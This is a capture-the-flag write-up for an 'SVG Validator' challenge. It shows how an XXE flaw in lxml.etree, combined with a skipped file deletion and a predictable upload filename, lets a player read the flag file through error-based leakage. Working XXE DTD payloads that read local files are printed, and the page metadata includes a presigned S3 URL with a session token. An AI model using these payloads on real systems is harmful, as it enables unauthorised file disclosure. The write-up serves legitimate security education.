---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466R2B2QXEW%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T141353Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJHMEUCICkEDGvnmEbZ0jHSzWzFfeUxTZ83KunyVJ6fKxnCp6UTAiEAt8M1EaL5SiDXFI5%2BB%2BXe%2BsmOIc0DNLKJW8EPaYBh0kkqiAQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDBrXuzH0auMpzjOLFSrcAzK8a6PjyUianfW7G6%2BXFZcTjDBO1rH7n8n%2FAnhgWQvr6ACiM2oEHu%2BBdhBxHQmIhi8Goy7xoI0VdyiUUzdizH8HWm%2B00rG3LN9zOZKnf5jkvbntNN9%2FGGCz2Bsfo%2BtisYF%2BnYdAXQfJ67%2BzzhbE7Qg5Qp0pi3py2w7soxRQC%2FXyFnBT2Cju9dNCLG%2BNw1VWgwcGGhhoKgwByO8Ol1RiBoakEGCpIk0Nfa%2BFYSKdGU%2BoIWXtHaG6TIrchpy0mpri4JWExUQb2o6wsYdEXOucv%2FeAV1GvIJdnJKxsuYch3SdgixZ0DjlTuXQ0OZzvzD%2FEfHhjUFsQSxLA1yof0zti%2FRNfAk0rMLTFoBA4oxZVVG14TWbYJl0rjkjUkXuBw4wakPNn%2BeA8pOOIsXG2BBNwwdBm0Vj9TmH9BNzYHikkJ23wPgtZoLxcKjqlC%2BQjhyRLVIU5YruzCk4I8ftXk80EXYwsaQ6Xip4XkaM21Apm6yqhffpwizeaHy9gE3RmXC94YPMHP%2FyngUtlXh1fXf9ES%2BfPonkL4X93bO3%2F0XpHGgygIeAgDdlasvniDU5xVSkLhviD6HxdJ2DzgzFl0FVGVgXuOw0hvaLxIMHE9NvuGyVIUyAF8Jd72Yh9vTRDMNnxwcEGOqUBFPm7a6gVfKs%2Fj0DyS2XzkUGYjSfJbQrUcbdzyzFS17BgaqGIhm2by9w0HcEoAAUod9ozg4CZITWmuXclyvJeW9l8tE2WXiOJrMSj1LZ9N40iD7dD%2FZT6VPzJivvNJFDhVjAuUBefMr93YoTzz%2FTFt7fsZGx5HnBspRPfdg7BADd1JqB4FQFQLxFDfCcUX7BVklSYoCv%2FZIc%2BjwOFQVFPYvyyeKIm\&X-Amz-Signature=3ff9bfa765c39cbe7bf8c6418e5ff122cf0c50062d3bcada1d503b8b3a069b98\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
